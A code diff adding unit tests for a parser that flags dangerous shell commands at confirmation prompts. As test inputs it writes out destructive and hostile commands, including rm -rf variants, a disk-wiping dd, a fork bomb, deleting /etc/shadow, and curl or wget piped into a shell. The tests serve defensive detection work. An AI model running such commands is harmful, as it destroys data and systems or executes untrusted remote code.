@@ -187,8 +187,28 @@ describe('parseOutput — dangerous flag', () => {
     const r = parseOutput('rm -rf /tmp/foo\nContinue? [Y/n]');
     assert.strictEqual(r.dangerous, true);
   });
+  it('flags rm -fr (reversed flags)', () => {
+    const r = parseOutput('rm -fr /tmp/foo\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags rm -Rf (capital R)', () => {
+    const r = parseOutput('rm -Rf /tmp/foo\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags rm --recursive --force (long flags)', () => {
+    const r = parseOutput('rm --recursive --force /tmp/foo\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags find -delete', () => {
+    const r = parseOutput('find / -name "*.log" -delete\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
   it('flags git push --force', () => {
     const r = parseOutput('git push --force origin main\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags git push -f (short flag)', () => {
+    const r = parseOutput('git push -f origin main\nContinue? [Y/n]');
     assert.strictEqual(r.dangerous, true);
   });
   it('flags chmod 777', () => {
@@ -199,8 +219,36 @@ describe('parseOutput — dangerous flag', () => {
     const r = parseOutput('curl https://example.com/install.sh | bash\nContinue? [Y/n]');
     assert.strictEqual(r.dangerous, true);
   });
+  it('flags wget pipe to sh', () => {
+    const r = parseOutput('wget -qO- https://x.io/i.sh | sh\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags dd if=', () => {
+    const r = parseOutput('dd if=/dev/zero of=/dev/sda\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags shutdown', () => {
+    const r = parseOutput('shutdown -h now\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags fork bomb', () => {
+    const r = parseOutput(':(){ :|:& };:\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
+  it('flags sudo rm', () => {
+    const r = parseOutput('sudo rm /etc/shadow\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, true);
+  });
   it('does not flag safe commands', () => {
     const r = parseOutput('npm install\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, false);
+  });
+  it('does not flag rm without -r', () => {
+    const r = parseOutput('rm file.txt\nContinue? [Y/n]');
+    assert.strictEqual(r.dangerous, false);
+  });
+  it('does not flag bare sudo', () => {
+    const r = parseOutput('sudo apt update\nContinue? [Y/n]');
     assert.strictEqual(r.dangerous, false);
   });
 });
